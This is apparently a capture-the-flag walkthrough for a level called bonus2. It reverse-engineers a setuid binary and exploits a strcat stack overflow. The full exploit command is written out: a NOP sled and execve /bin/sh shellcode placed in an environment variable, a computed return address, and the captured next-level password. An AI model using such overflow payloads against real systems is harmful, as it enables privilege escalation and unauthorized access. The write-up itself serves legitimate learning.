login : pw
	bonus2 : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

It takes aegis to disassemble each asm code manually as we previously did
So this time, let's be quicker:
	=> Lets make it as if we are in a hurry because yeah I tried to explain all of the previous levels going into details but you can actually perform buffer overflows much quicker
Ghidra
	=> 2 functions
		=> main + greetuser
	=> ac must be 3
	=> strncpy(buf1, av[1], 0x28) => 0x28 = 40
	=> strncpy(buf2, av[2], 0x20) => 0x20 = 32
	=> getenv("LANG")
	=> memcmp(lang, &DAT_0804873d, 2)
		=> DAT_0804873d being "fi"
		=> set language to 1
			=> language = global var
	=> memcmp(lang, &DAT_08048740, 2)
		=> DAT_08048740 being "nl"
		=> set language to 2
		=> DAT_0804873d being "fi"
		=> set language to 1
			=> language = global var
	=> return greetuser
	
	=> greetuser
		=> Looks like a big mess with language var comparison
		=> strcat(something_defined_in_above_mess, stack variable)
		=> puts(1st_param_of_strcat)

In ghidra main, you may have seen weird for loops:
	=> Look at the asm
		=> first loop is a rep stos instruction
			=> Just stores content of edi into eax before being overwritten by strncpy
		=> second loop is a rep movs instruction
			=> Just copies esi into edi and nothing happens afterward
		=> both of them are useless

Lets complete it with gdb

disas greetuser
	We see 3 if comparison with language
	Let's give a look at the asm code of the first one
		=> jmp if language = 1
			=> greetuser+54
			=> mov    edx,0x8048717
			=> x/s 0x8048717
				=> "Hyvää päivää "
			=> stores it on greetuser stack (ebp-0x48)
				=> copies each byte one after the other in eax
			=> jmp to greetuser+134
		=> jmp if language = 2
			=> greetuser+101
			=> same but with "Goedemiddag! "
		=> jmp if language = 0
			=> same but with "Hello "
			=> greetuser 
		=> Ill put strcpy in source.c to avoid copying byte after byte
			=> strcpy is NOT called so no buffer overflow here
	strcat is called with
		=> esp+0x4 = ebp+0x8 (oh there is a function param after all)

disas main
	=> rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
		=> counter is 0x13 = 19
		=> edi is esp
		=> esi is esp+0x50 which is first param passed to first strncpy

Ok we have our source.c
	=> Note that this source.c being mainly done with ghidra may be not exactly accurate but that's enough if we want to be fast

We can see that we need to exploit the strcat function call in greetuser as it is the only vulnerable function

we need to set an env parameter LANG to be in the greetuser so lets go for it
env -i LANG="" gdb bonus2
b greetuser
r abc def
	=> breakpoint hit
		=> perfect
Lets find the offset
r $(python -c 'print "a" * 100') $(python -c 'print "b" * 100')
	=> segfault in 0x08006262
first strncpy is 40 bytes long, so
r $(python -c 'print "a" * 40') $(python -c 'print "b" * 100')
	=> segfault in 0x08006262
		=> perfect
Here I cant fully overwrite the address
strcat based on buf which is an hardcoded string
Lets try to put the longest one and see what happens
	=> language must be 1
	=> LANG must be "fi"
env -i LANG="fi" gdb bonus2
	=> r $(python -c 'print "a" * 40') $(python -c 'print "b" * 100')
		=> segfault (0x62626262)
			=> perfect, it's won

Lets find the offset
gdb-peda => pattern create 100
	=> segfault 0x2d414143
		=> CAA-
pattern offset CAA-
	=> 18

40 + 18 = 58 bytes
	=> A bit small => Lets go for env var

env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') LANG="fi" gdb bonus2
unset env COLUMNS
unset env LINES
start
i var environ
	=> 0xb7fd2e04  environ
x/s *((char**)environ)
	=> 0xbfffd875:	 "exploit=...
Nopsled size = 10000
	=> p/x 0xbfffd875+5000
		=> 0xbfffebfd
r $(python -c 'print "a"*40') $(python -c 'print "b"*18 + "\xfd\xeb\xff\xbf"')
	=> shell started

Lets do it outside gdb

env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') LANG="fi" ./bonus2 $(python -c 'print "a"*40') $(python -c 'print "b"*18 + "\xfd\xeb\xff\xbf"')
	=> shell started
	=> whoami
		=> bonus3
	=> cat /home/user/bonus3/.pass
		=> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
